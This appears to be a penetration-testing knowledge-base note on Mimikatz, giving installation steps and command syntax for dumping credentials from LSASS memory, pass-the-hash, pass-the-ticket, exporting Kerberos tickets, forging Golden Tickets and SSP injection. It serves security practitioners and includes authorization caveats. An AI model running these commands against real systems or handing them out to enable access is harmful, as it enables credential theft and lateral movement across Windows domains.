## Overview
Mimikatz is an open-source tool that allows attackers and penetration testers to extract plaintext passwords, hash, PIN codes, and Kerberos tickets from memory. Developed by Benjamin Delpy, Mimikatz has become a staple in the toolkit of security professionals for post-exploitation activities, especially in Windows environments. It is widely used to demonstrate the importance of securing credential storage and implementing strong security controls to prevent unauthorized access.

Mimikatz is capable of performing a variety of credential-related attacks, including Pass-the-Hash (PtH), Pass-the-Ticket (PtT), Kerberos Golden and Silver Ticket creation, and more.

## Features
- **Credential Dumping:** Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and other credentials from memory.
- **Pass-the-Hash (PtH) Attacks:** Uses NTLM hashes to authenticate without knowing the plaintext password.
- **Pass-the-Ticket (PtT) Attacks:** Uses Kerberos tickets to authenticate without needing access to the original credentials.
- **Kerberos Ticket Manipulation:** Creates and forges Golden and Silver Tickets to maintain persistent access.
- **Security Support Provider (SSP) Injection:** Injects malicious SSP DLLs into memory to capture credentials.
- **Credential Debugging:** Displays security information related to credentials and authentication tokens.
- **Cross-Platform Compatibility:** Primarily designed for Windows, but some functionality can be used on Linux systems with Wine.

## Website
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)

## Installation

### On Windows:

1. **Download Mimikatz:**

   - Download the latest release of Mimikatz from the [official GitHub repository](https://github.com/gentilkiwi/mimikatz/releases).

2. **Run Mimikatz:**

   - Unzip the downloaded archive and navigate to the directory containing `mimikatz.exe`.
   - Run `mimikatz.exe` as an Administrator:

```cmd
.\mimikatz.exe
```

### On Unix-based systems (Linux/macOS):

1. **Install Wine:**

   - Mimikatz requires Wine to run on Unix-based systems. Install Wine using your package manager.

   - **On Debian-based systems:**

```sh
sudo apt-get install wine
```

   - **On macOS using Homebrew:**

```sh
brew install --cask wine-stable
```

2. **Download and Run Mimikatz:**

   - Download the latest release of Mimikatz from the [official GitHub repository](https://github.com/gentilkiwi/mimikatz/releases).

   - Run Mimikatz using Wine:

```sh
wine mimikatz.exe
```

## Basic Usage
Mimikatz provides a wide range of modules and commands for credential dumping and manipulation. Here are some common commands and usage examples:

### Running Mimikatz Commands
To run Mimikatz commands, start `mimikatz.exe` and use the following syntax:

```cmd
mimikatz # privilege::debug
```

- **`privilege::debug`**: Enables debug privileges required for most Mimikatz commands.

### Dumping Plaintext Passwords
To dump plaintext passwords from memory:

```cmd
mimikatz # sekurlsa::logonpasswords
```

- **`sekurlsa::logonpasswords`**: Dumps plaintext passwords from Local Security Authority Subsystem Service (LSASS) memory.

### Dumping NTLM Hashes
To extract NTLM hashes from memory:

```cmd
mimikatz # sekurlsa::logonpasswords
```

- **`sekurlsa::logonpasswords`**: Dumps NTLM hashes along with plaintext passwords from LSASS memory.

### Pass-the-Hash (PtH) Attack
To perform a Pass-the-Hash attack using extracted NTLM hashes:

```cmd
mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:cmd.exe
```

- **`sekurlsa::pth`**: Performs a Pass-the-Hash attack.
- **`/user:username`**: Specifies the target username.
- **`/domain:domain`**: Specifies the target domain.
- **`/ntlm:hash`**: Specifies the NTLM hash to use.
- **`/run:cmd.exe`**: Executes `cmd.exe` with the given credentials.

### Pass-the-Ticket (PtT) Attack
To perform a Pass-the-Ticket attack using a Kerberos ticket:

```cmd
mimikatz # kerberos::ptt ticket.kirbi
```

- **`kerberos::ptt`**: Injects a Kerberos ticket into memory.

### Dumping Kerberos Tickets
To dump Kerberos tickets from memory:

```cmd
mimikatz # sekurlsa::tickets /export
```

- **`sekurlsa::tickets /export`**: Dumps and exports Kerberos tickets from memory.

### Creating a Golden Ticket
To create a Golden Ticket for persistent access:

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /id:500
```

- **`kerberos::golden`**: Creates a Kerberos Golden Ticket.
- **`/user:Administrator`**: Specifies the username for the ticket.
- **`/domain:domain.local`**: Specifies the target domain.
- **`/sid:S-1-5-21-...`**: Specifies the domain SID.
- **`/krbtgt:krbtgt_hash`**: Specifies the NTLM hash of the KRBTGT account.
- **`/id:500`**: Specifies the user ID (typically 500 for the Administrator account).

## Key Features and Commands

### Credential Dumping
- **Description:** Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.
- **Usage:**
```cmd
mimikatz # sekurlsa::logonpasswords
```

### Pass-the-Hash (PtH)
- **Description:** Uses NTLM hashes to authenticate without needing plaintext passwords.
- **Usage:**
```cmd
mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:cmd.exe
```

### Pass-the-Ticket (PtT)
- **Description:** Uses Kerberos tickets to authenticate without needing original credentials.
- **Usage:**
```cmd
mimikatz # kerberos::ptt ticket.kirbi
```

### Golden Ticket Creation
- **Description:** Creates a Kerberos Golden Ticket to gain and maintain persistent access within a domain.
- **Usage:**
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /id:500
```

### Dumping Kerberos Tickets
- **Description:** Dumps Kerberos tickets from memory for reuse in attacks like Pass-the-Ticket.
- **Usage:**
```cmd
mimikatz # sekurlsa::tickets /export
```

### Security Support Provider (SSP) Injection
- **Description:** Injects custom SSP DLLs into memory to capture credentials during login processes.
- **Usage:**
```cmd
mimikatz # misc::memssp
```

## Tools for Credential Dumping and Post-Exploitation Using Mimikatz

- **Credential Harvesting:** Use Mimikatz to extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory to gain further access.
- **Lateral Movement:** Leverage extracted credentials to move laterally across a network, compromising additional systems.
- **Maintaining Persistence:** Create Golden and Silver Tickets to maintain persistent access to compromised domains.
- **Password Cracking:** Extract NTLM hashes for offline password cracking and analysis to identify weak passwords.
- **Bypassing Authentication:** Perform Pass-the-Hash and Pass-the-Ticket attacks to bypass authentication mechanisms without needing plaintext credentials.

## Best Practices
- **Use Mimikatz Responsibly:** Always ensure that you have proper authorization before using Mimikatz for offensive security tasks and post-exploitation activities.
- **Practice Operational Security:** Use Mimikatz in a controlled environment and ensure you have the necessary permissions to execute these commands.
- **Combine with Other Tools:** Use Mimikatz alongside other post-exploitation tools like [[CrackMapExec]], [[PowerSploit]], and [[Empire]] for comprehensive assessments.
- **Keep Mimikatz Updated:** Regularly update Mimikatz to benefit from the latest features, security enhancements, and bug fixes.
- **Analyze Outputs Carefully:** Review the output of Mimikatz commands carefully to identify potential vulnerabilities, misconfigurations, and opportunities for further exploitation.

## References
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- [Mimikatz Tutorial for Post-Exploitation](https://www.hackingarticles.in/comprehensive-guide-on-mimikatz-for-post-exploitation/)
- [Mimikatz Cheat Sheet](https://highon.coffee/blog/mimikatz-cheat-sheet/)
- [How to Use Mimikatz to Dump Credentials](https://null-byte.wonderhowto.com/how-to/use-mimikatz-dump-passwords-windows-memory-0189762/)

